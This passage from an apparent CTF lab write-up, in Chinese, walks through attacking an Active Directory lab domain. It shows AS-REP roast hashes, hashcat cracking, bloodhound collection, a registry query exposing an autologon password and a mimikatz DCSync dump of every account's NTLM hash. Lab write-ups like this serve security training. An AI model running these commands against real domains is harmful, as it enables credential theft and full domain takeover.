set</span><br><span class=\"line\">[-] User xuanjiang doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] User yangju doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] User yanglang doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] User yexing doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] User yifu doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] User yuanchang doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] User yulvxue doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">$krb5asrep$23$zhangxin@XIAORANG.LAB:7aa36d3b1959318ccfe126e76624e4ea$c73a0aae1f17c00a07e9475d06964867c0adbbc19cdce676cc50a36aa3a12531021ef9e28202b027ae19fd538350edbe77d9dcf68ce187a2bf20ea2d559b478d12b7a9b4663f35611b8306da742d770ebbfe376e3e0af67aefe160e5ab422b219b4895f86e2735d536ed4ac7de07fd6400f9f8ca821c21c42325e4ce3e08ed70644dc44f62495853e169b4954624ef0fa2e1be73b336a276a35d4a32f6f4194e85498bb8c9412caeeb520d8fbca27bea8d3c694950bd019217683d429f727d95adefddf103790450a27e2fd750e8e220984f3bae37b95d582127861d2c62ab13e7c55512274df513b95043d0</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] User zhaoxiu doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] User zhenjun doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] User zhufeng doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br></pre></td></tr></table></figure>\n\n<p>可以得到了两个用户的密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$krb5asrep$23$wenshao@XIAORANG.LAB:fde3340835efa9c8cb0330ae567c5c46$8228d9ae7bbd8e0ddcb991f14dfdd653bf2f05bd78effb9f48aa1095c7f4ee832254961a1d17de3e3e6cfd76c4048774b1c30bf45220d6f4f7dd6d958395dff97b733372d3562060209baa7ae25ca86734be598b1e7e42678d9bfacf14676b5d4f51b268a780b4dd6da66b2518dcf4888d658ea8ade7a35a40a9d6965bb304995498bf1cdcea67431d870c9e69982bcb25037fa8f8dc16695e0ecce65333e6f88231016fdc6312adf0d77749b63f85d05d1437d9a4290520de6272d3c0a636b4baf8ed7de278fcb5106503e57e35df5adbb9dd46503a58c0655e538ea24774f2c08234f6905e3120da8fc3fa</span><br><span class=\"line\"></span><br><span class=\"line\">$krb5asrep$23$zhangxin@XIAORANG.LAB:7aa36d3b1959318ccfe126e76624e4ea$c73a0aae1f17c00a07e9475d06964867c0adbbc19cdce676cc50a36aa3a12531021ef9e28202b027ae19fd538350edbe77d9dcf68ce187a2bf20ea2d559b478d12b7a9b4663f35611b8306da742d770ebbfe376e3e0af67aefe160e5ab422b219b4895f86e2735d536ed4ac7de07fd6400f9f8ca821c21c42325e4ce3e08ed70644dc44f62495853e169b4954624ef0fa2e1be73b336a276a35d4a32f6f4194e85498bb8c9412caeeb520d8fbca27bea8d3c694950bd019217683d429f727d95adefddf103790450a27e2fd750e8e220984f3bae37b95d582127861d2c62ab13e7c55512274df513b95043d0</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>用hashcat爆破一下<code>└─# hashcat -m 18200 passhash  /usr/share/wordlists/rockyou.txt</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$krb5asrep$23$wenshao@XIAORANG.LAB:fde3340835efa9c8cb0330ae567c5c46$8228d9ae7bbd8e0ddcb991f14dfdd653bf2f05bd78effb9f48aa1095c7f4ee832254961a1d17de3e3e6cfd76c4048774b1c30bf45220d6f4f7dd6d958395dff97b733372d3562060209baa7ae25ca86734be598b1e7e42678d9bfacf14676b5d4f51b268a780b4dd6da66b2518dcf4888d658ea8ade7a35a40a9d6965bb304995498bf1cdcea67431d870c9e69982bcb25037fa8f8dc16695e0ecce65333e6f88231016fdc6312adf0d77749b63f85d05d1437d9a4290520de6272d3c0a636b4baf8ed7de278fcb5106503e57e35df5adbb9dd46503a58c0655e538ea24774f2c08234f6905e3120da8fc3fa:hellokitty</span><br><span class=\"line\">$krb5asrep$23$zhangxin@XIAORANG.LAB:7aa36d3b1959318ccfe126e76624e4ea$c73a0aae1f17c00a07e9475d06964867c0adbbc19cdce676cc50a36aa3a12531021ef9e28202b027ae19fd538350edbe77d9dcf68ce187a2bf20ea2d559b478d12b7a9b4663f35611b8306da742d770ebbfe376e3e0af67aefe160e5ab422b219b4895f86e2735d536ed4ac7de07fd6400f9f8ca821c21c42325e4ce3e08ed70644dc44f62495853e169b4954624ef0fa2e1be73b336a276a35d4a32f6f4194e85498bb8c9412caeeb520d8fbca27bea8d3c694950bd019217683d429f727d95adefddf103790450a27e2fd750e8e220984f3bae37b95d582127861d2c62ab13e7c55512274df513b95043d0:strawberry</span><br></pre></td></tr></table></figure>\n\n<p><code>wenshao:hellokitty</code>、<code>zhangxin:strawberry</code></p>\n<p>用bloodhound进行信息搜集</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# bloodhound-python -u zhangxin -p strawberry -d xiaorang.lab -dc DC-PROGAME.xiaorang.lab -c all --dns-tcp -ns 172.22.6.12 --auth-method ntlm --zip</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time2.png\"></p>\n<p>借一张大佬的图，可以看到WIN2019.XIAORANG.LAB到<a href=\"mailto:&#89;&#x55;&#x58;&#85;&#65;&#x4e;&#x40;&#x58;&#x49;&#65;&#79;&#x52;&#65;&#78;&#71;&#46;&#76;&#65;&#66;\">&#89;&#x55;&#x58;&#85;&#65;&#x4e;&#x40;&#x58;&#x49;&#65;&#79;&#x52;&#65;&#78;&#71;&#46;&#76;&#65;&#66;</a>是有HasSession的，</p>\n<p>HasSession：用户与计算机时进行会话时，凭据会保留在内存中，说明yuxuan这个用户登录过WIN2019</p>\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time3.png\"></p>\n<p>可以直接查看注册表</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">C:\\Users\\zhangxin\\Desktop&gt;reg query &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon</span><br><span class=\"line\">    AutoRestartShell    REG_DWORD    0x1</span><br><span class=\"line\">    Background    REG_SZ    0 0 0</span><br><span class=\"line\">    CachedLogonsCount    REG_SZ    10</span><br><span class=\"line\">    DebugServerCommand    REG_SZ    no</span><br><span class=\"line\">    DisableBackButton    REG_DWORD    0x1</span><br><span class=\"line\">    EnableSIHostIntegration    REG_DWORD    0x1</span><br><span class=\"line\">    ForceUnlockLogon    REG_DWORD    0x0</span><br><span class=\"line\">    LegalNoticeCaption    REG_SZ</span><br><span class=\"line\">    LegalNoticeText    REG_SZ</span><br><span class=\"line\">    PasswordExpiryWarning    REG_DWORD    0x5</span><br><span class=\"line\">    PowerdownAfterShutdown    REG_SZ    0</span><br><span class=\"line\">    PreCreateKnownFolders    REG_SZ    &#123;A520A1A4-1780-4FF6-BD18-167343C5AF16&#125;</span><br><span class=\"line\">    ReportBootOk    REG_SZ    1</span><br><span class=\"line\">    Shell    REG_SZ    explorer.exe</span><br><span class=\"line\">    ShellCritical    REG_DWORD    0x0</span><br><span class=\"line\">    ShellInfrastructure    REG_SZ    sihost.exe</span><br><span class=\"line\">    SiHostCritical    REG_DWORD    0x0</span><br><span class=\"line\">    SiHostReadyTimeOut    REG_DWORD    0x0</span><br><span class=\"line\">    SiHostRestartCountLimit    REG_DWORD    0x0</span><br><span class=\"line\">    SiHostRestartTimeGap    REG_DWORD    0x0</span><br><span class=\"line\">    Userinit    REG_SZ    C:\\Windows\\system32\\userinit.exe,</span><br><span class=\"line\">    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile</span><br><span class=\"line\">    WinStationsDisabled    REG_SZ    0</span><br><span class=\"line\">    ShellAppRuntime    REG_SZ    ShellAppRuntime.exe</span><br><span class=\"line\">    scremoveoption    REG_SZ    0</span><br><span class=\"line\">    DisableCAD    REG_DWORD    0x1</span><br><span class=\"line\">    LastLogOffEndTimePerfCounter    REG_QWORD    0xedd7ccd15</span><br><span class=\"line\">    ShutdownFlags    REG_DWORD    0x80000027</span><br><span class=\"line\">    AutoLogonSID    REG_SZ    S-1-5-21-3623938633-4064111800-2925858365-1180</span><br><span class=\"line\">    LastUsedUsername    REG_SZ    yuxuan</span><br><span class=\"line\">    AutoAdminLogon    REG_SZ    1</span><br><span class=\"line\">    DefaultUserName    REG_SZ    yuxuan</span><br><span class=\"line\">    DefaultPassword    REG_SZ    Yuxuan7QbrgZ3L</span><br><span class=\"line\">    DefaultDomainName    REG_SZ    xiaorang.lab</span><br><span class=\"line\"></span><br><span class=\"line\">HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AlternateShells</span><br><span class=\"line\">HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\GPExtensions</span><br><span class=\"line\">HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\UserDefaults</span><br><span class=\"line\">HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AutoLogonChecked</span><br><span class=\"line\">HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\VolatileUserMgrKey</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">DefaultUserName    REG_SZ    yuxuan</span><br><span class=\"line\"> DefaultPassword    REG_SZ    Yuxuan7QbrgZ3L</span><br><span class=\"line\"> DefaultDomainName    REG_SZ    xiaorang.lab</span><br></pre></td></tr></table></figure>\n\n<p>yuxuan用户滥用了SID历史功能(SIDHistory是一个为支持域迁移方案而设置的属性，当一个对象从一个域迁移到另一个域时，会在新域创建一个新的SID作为该对象的objectSid，在之前域中的SID会添加到该对象的sIDHistory属性中，此时该对象将保留在原来域的SID对应的访问权限</p>\n<p>先登录yuxuan用户，然后用mimikatz抓取administrator的哈希</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Users\\yuxuan\\Desktop&gt;mimikatz.exe &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; &quot;exit&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36</span><br><span class=\"line\"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br><span class=\"line\"> ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class=\"line\"> ## \\ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span><br><span class=\"line\"> &#x27;## v ##&#x27;       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class=\"line\">  &#x27;#####&#x27;        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/</span><br><span class=\"line\"></span><br><span class=\"line\">mimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv</span><br><span class=\"line\">[DC] &#x27;xiaorang.lab&#x27; will be the domain</span><br><span class=\"line\">[DC] &#x27;DC-PROGAME.xiaorang.lab&#x27; will be the DC server</span><br><span class=\"line\">[DC] Exporting domain &#x27;xiaorang.lab&#x27;</span><br><span class=\"line\">1103    shuzhen 07c1f387d7c2cf37e0ca7827393d2327        512</span><br><span class=\"line\">1104    gaiyong 52c909941c823dbe0f635b3711234d2e        512</span><br><span class=\"line\">1106    xiqidi  a55d27cfa25f3df92ad558c304292f2e        512</span><br><span class=\"line\">1107    wengbang        6b1d97a5a68c6c6c9233d11274d13a2e        512</span><br><span class=\"line\">1108    xuanjiang       a72a28c1a29ddf6509b8eabc61117c6c        512</span><br><span class=\"line\">1109    yuanchang       e1cea038f5c9ffd9dc323daf35f6843b        512</span><br><span class=\"line\">1110    lvhui   f58b31ef5da3fc831b4060552285ca54        512</span><br><span class=\"line\">1111    wenbo   9abb7115997ea03785e92542f684bdde        512</span><br><span class=\"line\">1112    zhenjun 94c84ba39c3ece24b419ab39fdd3de1a        512</span><br><span class=\"line\">1113    jinqing 4bf6ad7a2e9580bc8f19323f96749b3a        512</span><br><span class=\"line\">1115    yangju  1fa8c6b4307149415f5a1baffebe61cf        512</span><br><span class=\"line\">1117    weicheng        796a774eace67c159a65d6b86fea1d01        512</span><br><span class=\"line\">1118    weixian 8bd7dc83d84b3128bfbaf165bf292990        512</span><br><span class=\"line\">1119    haobei  045cc095cc91ba703c46aa9f9ce93df1        512</span><br><span class=\"line\">1120    jizhen  1840c5130e290816b55b4e5b60df10da        512</span><br><span class=\"line\">1121    jingze  3c8acaecc72f63a4be945ec6f4d6eeee        512</span><br><span class=\"line\">1122    rubao   d8bd6484a344214d7e0cfee0fa76df74        512</span><br><span class=\"line\">1123    zhaoxiu 694c5c0ec86269daefff4dd611305fab        512</span><br><span class=\"line\">1124    tangshun        90b8d8b2146db6456d92a4a133eae225        512</span><br><span class=\"line\">1125    liangliang      c67cd4bae75b82738e155df9dedab7c1        512</span><br><span class=\"line\">1126    qiyue   b723d29e23f00c42d97dd97cc6b04bc8        512</span><br><span class=\"line\">1127    chouqian        c6f0585b35de1862f324bc33c920328d        512</span><br><span class=\"line\">1128    jicheng 159ee55f1626f393de119946663a633c        512</span><br><span class=\"line\">1129    xiyi    ee146df96b366efaeb5138832a75603b        512</span><br><span class=\"line\">1130    beijin  a587b90ce9b675c9acf28826106d1d1d        512</span><br><span class=\"line\">1131    chenghui        08224236f9ddd68a51a794482b0e58b5        512</span><br><span class=\"line\">1132    chebin  b50adfe07d0cef27ddabd4276b3c3168        512</span><br><span class=\"line\">1133    pengyuan        a35d8f3c986ab37496896cbaa6cdfe3e        512</span><br><span class=\"line\">1134    yanglang        91c5550806405ee4d6f4521ba6e38f22        512</span><br><span class=\"line\">1135    jihuan  cbe4d79f6264b71a48946c3fa94443f5        512</span><br><span class=\"line\">1136    duanmuxiao      494cc0e2e20d934647b2395d0a102fb0        512</span><br><span class=\"line\">1137    hongzhi f815bf5a1a17878b1438773dba555b8b        512</span><br><span class=\"line\">1138    gaijin  b1040198d43631279a63b7fbc4c403af        512</span><br><span class=\"line\">1139    yifu    4836347be16e6af2cd746d3f934bb55a        512</span><br><span class=\"line\">1140    fusong  adca7ec7f6ab1d2c60eb60f7dca81be7        512</span><br><span class=\"line\">1141    luwan   c5b2b25ab76401f554f7e1e98d277a6a        512</span><br><span class=\"line\">1142    tangrong        2a38158c55abe6f6fe4b447fbc1a3e74        512</span><br><span class=\"line\">1143    zhufeng 71e03af8648921a3487a56e4bb8b5f53        512</span><br><span class=\"line\">1145    dongcheng       f2fdf39c9ff94e24cf185a00bf0a186d        512</span><br><span class=\"line\">1146    lianhuangchen   23dc8b3e465c94577aa8a11a83c001af        512</span><br><span class=\"line\">1147    lili    b290a36500f7e39beee8a29851a9f8d5        512</span><br><span class=\"line\">1148    huabi   02fe5838de111f9920e5e3bb7e009f2f        512</span><br><span class=\"line\">1149    rangsibo        103d0f70dc056939e431f9d2f604683c        512</span><br><span class=\"line\">1150    wohua   cfcc49ec89dd76ba87019ca26e5f7a50        512</span><br><span class=\"line\">1151    haoguang        33efa30e6b3261d30a71ce397c779fda        512</span><br><span class=\"line\">1152    langying        52a8a125cd369ab16a385f3fcadc757d        512</span><br><span class=\"line\">1153    diaocai a14954d5307d74cd75089514ccca097a        512</span><br><span class=\"line\">1154    lianggui        4ae2996c7c15449689280dfaec6f2c37        512</span><br><span class=\"line\">1155    manxue  0255c42d9f960475f5ad03e0fee88589        512</span><br><span class=\"line\">1156    baqin   327f2a711e582db21d9dd6d08f7bdf91        512</span><br><span class=\"line\">1157    chengqiu        0d0c1421edf07323c1eb4f5665b5cb6d        512</span><br><span class=\"line\">1158    louyou  a97ba112b411a3bfe140c941528a4648        512</span><br><span class=\"line\">1159    maqun   485c35105375e0754a852cee996ed33b        512</span><br><span class=\"line\">1160    wenbiao 36b6c466ea34b2c70500e0bfb98e68bc        512</span><br><span class=\"line\">1161    weishengshan    f60a4233d03a2b03a7f0ae619c732fae        512</span><br><span class=\"line\">1163    chuyuan 0cfdca5c210c918b11e96661de82948a        512</span><br><span class=\"line\">1164    wenliang        a4d2bacaf220292d5fdf9e89b3513a5c        512</span><br><span class=\"line\">1165    yulvxue cf970dea0689db62a43b272e2c99dccd        512</span><br><span class=\"line\">1166    luyue   274d823e941fc51f84ea323e22d5a8c4        512</span><br><span class=\"line\">1167    ganjian 7d3c39d94a272c6e1e2ffca927925ecc        512</span><br><span class=\"line\">1168    pangzhen        51d37e14983a43a6a45add0ae8939609        512</span><br><span class=\"line\">1169    guohong d3ce91810c1f004c782fe77c90f9deb6        512</span><br><span class=\"line\">1170    lezhong dad3990f640ccec92cf99f3b7be092c7        512</span><br><span class=\"line\">1171    sheweiyue       d17aecec7aa3a6f4a1e8d8b7c2163b35        512</span><br><span class=\"line\">1172    dujian  8f7846c78f03bf55685a697fe20b0857        512</span><br><span class=\"line\">1173    lidongjin       34638b8589d235dea49e2153ae89f2a1        512</span><br><span class=\"line\">1174    hongqun 6c791ef38d72505baeb4a391de05b6e1        512</span><br><span class=\"line\">1175    yexing  34842d36248c2492a5c9a1ae5d850d54        512</span><br><span class=\"line\">1176    maoda   6e65c0796f05c0118fbaa8d9f1309026        512</span><br><span class=\"line\">1177    qiaomei 6a889f350a0ebc15cf9306687da3fd34        512</span><br><span class=\"line\">502     krbtgt  a4206b127773884e2c7ea86cdd282d9c        514</span><br><span class=\"line\">500     Administrator   04d93ffd6f5f6e4490e0de23f240a5e9        512</span><br><span class=\"line\">1000    DC-PROGAME$     b1f83a8f5daf6f7825f6a69d98c8f364        532480</span><br><span class=\"line\">1180    yuxuan  376ece347142d1628632d440530e8eed        66048</span><br><span class=\"line\">1181    WIN2019$        5447da4f138ae51f887cf24e79a9eba3        4096</span><br><span class=\"line\">1178    wenshao b31c6aa5660d6e87ee046b1bb5d0ff79        4260352</span><br><span class=\"line\">1179    zhangxin        d6c5976e07cdb410be19b84126367e3d        4260352</span><br><span class=\"line\"></span><br><span class=\"line\">mimikatz(commandline) # exit</span><br><span class=\"line\">Bye!</span><br></pre></td></tr></table></figure>\n\n<p>有了administrator的密码了，就相当于控制域控了，登录一下其他的机器type flag就行了</p>\n<h1 id=\"FLAG3、4\"><a href=\"#FLAG3、4\" class=\"headerlink\" 